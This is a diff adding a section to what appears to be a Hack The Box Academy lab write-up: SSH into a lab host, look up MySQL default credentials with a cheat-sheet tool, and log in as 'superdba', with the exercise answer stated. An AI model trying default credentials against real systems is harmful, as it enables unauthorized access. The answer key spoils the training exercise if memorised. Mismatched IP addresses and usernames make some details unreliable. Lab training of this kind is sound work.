@@ -262,3 +262,56 @@ smb: \> exit
 └──╼ [★]$ cat flag.txt
 HTB{redacted}
 ```
+
+
+- Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. SSH to 10.129.20.31 (ACADEMY-PWATTACKS-NIX01), with user "`sam`" and password "`B@tm@n2022!`"
+	- **superdb:admin**
+
+#### Logging into SSH
+
+Provide the given password to login into SSH as `sam` user.
+
+```bash
+$ ssh sam@10.129.20.34
+```
+
+#### Looking for Default Creds
+
+Install the default credentials first using `pip3 install defaultcreds-cheat-sheet`. You might need to setup python virtual environment first. Since we are exploiting `mysql` so I used the below command to look up for default creds.
+
+```bash
+$ creds search mysql
++---------------------+-------------------+----------+
+| Product             |      username     | password |
++---------------------+-------------------+----------+
+| mysql (ssh)         |        root       |   root   |
+| mysql               | admin@example.com |  admin   |
+| mysql               |        root       | <blank>  |
+| mysql               |      superdba     |  admin   |
+| scrutinizer (mysql) |    scrutremote    |  admin   |
++---------------------+-------------------+----------+
+```
+
+#### Logging into MySQL
+
+Logging into MySQL using the default credentials list.
+
+```bash
+$ mysql -u superdba -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 13
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+```
+
+So we were successfully able to login into the MySQL using the default credentials `superdb:admin`
